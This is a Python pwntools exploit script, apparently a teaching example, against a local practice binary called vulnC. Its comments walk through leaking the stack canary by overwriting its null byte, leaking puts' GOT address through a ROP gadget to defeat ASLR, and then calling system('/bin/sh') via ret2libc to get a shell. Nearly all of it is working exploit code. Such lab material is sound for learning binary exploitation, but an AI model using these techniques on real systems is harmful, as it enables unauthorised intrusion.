import struct
import pwn

# vulnC is a 64-bit dynamically linked executable
# NX is enabled, there is a gcc canary, ASLR is turned on

# This is an example for a basic buffer overflow defeating gcc stack canaries
# This exploit overwrites the least significant byte of the canary, in order to leak the rest of the canary
# We then do a puts(puts got) to defeat ASLR and ret2libc

# read() reads up to 128 bytes into a 48 byte buffer
# puts is then called to echo back to us our input
# if the first byte of our input is 'q' we will ret

# Canary is stored at [rbp-0x8] (the first 8-byte position)
# 0x40 (64) is subtracted from rsp. We have an 8-byte canary, and 48 bytes of buffer, so there must be 8 additional bytes between them
# So, our stack should look like:

# [48 bytes (6 8-byte chunks)]
# [8 other bytes]
# [canary]
# [previous frame rbp]
# [return address]

# puts() will print out up until the first null byte it encounters
# Stack canaries always end in a null byte
# If we overwrite up until just the least significant byte of the stack canary, the rest of it will be leaked

# Testing in gdb, we confirm that writing 57 bytes will overwrite the lsb of the canary
# Also notice that if you send with 'enter' the newline will be written as well
# We can use pwn to send without a newline because the target is using read()

target = pwn.process('./vulnC')
# pwn.gdb.attach(target, gdbscript="b *0x401260") # Address of leave instruction

############################
#### Leaking the Canary ####
############################

target.send(b'a' * 57)
target.recvuntil(b'a' * 57)
canary = target.recv(7)

canary = b'\x00' + canary # Add null byte back to the end of the canary
if (len(canary) != 8): # This could occur if there were null bytes on the inside of the canary
    print("Canary Error: bad luck, try again")
    exit()
canary = struct.unpack("<Q", canary)[0]

print(f"canary: {hex(canary)}")

##########################
#### leaking puts got ####
##########################

target_elf = pwn.ELF('vulnC')

puts_plt = target_elf.symbols['puts']
puts_got = target_elf.got['puts']

print(f"puts plt: {hex(puts_plt)}, puts got: {hex(puts_got)}")

# pop rdi gadget
# ropper --file vulnC --search 'pop rdi; ret'
# 0x00000000004012d3: pop rdi; ret; 
pop_rdi = struct.pack("<Q", 0x4012d3)
ret_pad = struct.pack("<Q", 0x4012d3 + 1)

# Main loopback address
loopback_addr = struct.pack("<Q", 0x4011b6)

puts_leak_payload = b'a' * 56
puts_leak_payload += struct.pack("<Q", canary)
puts_leak_payload += b'b' * 8
puts_leak_payload += pop_rdi
puts_leak_payload += struct.pack("<Q", puts_got)
puts_leak_payload += struct.pack("<Q", puts_plt)
puts_leak_payload += loopback_addr

target.send(puts_leak_payload)

target.recvuntil(b'>')

target.sendline(b'q')

target.recvuntil(b'q\n') # this is the q\n
target.recvline() # This is the rest of the a's still in the buffer

puts_got_leak = target.recvline()
puts_got_leak = puts_got_leak.strip(b'\n')
puts_got_leak = puts_got_leak + b'\x00' * (8 - len(puts_got_leak))
puts_got_leak = struct.unpack("<Q", puts_got_leak)[0]

print(f"puts got: {hex(puts_got_leak)}")

###############################################################
#### Calculating libc addrs and constructing final payload ####
###############################################################

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_puts_offset = libc_elf.symbols['puts']
libc_system_offset = libc_elf.symbols['system']
libc_bin_sh_offset = next(libc_elf.search(b'/bin/sh'))

libc_base = puts_got_leak - libc_puts_offset

print(f"libc_base: {hex(libc_base)}")

final_payload = b'a' * 56
final_payload += struct.pack("<Q", canary)
final_payload += b'b' * 8
final_payload += pop_rdi
final_payload += struct.pack("<Q", libc_base + libc_bin_sh_offset)
final_payload += ret_pad
final_payload += struct.pack("<Q", libc_base + libc_system_offset)

target.recvuntil(b'>')

target.send(final_payload)
target.recvuntil(b'>')
target.sendline(b'q')

target.interactive()

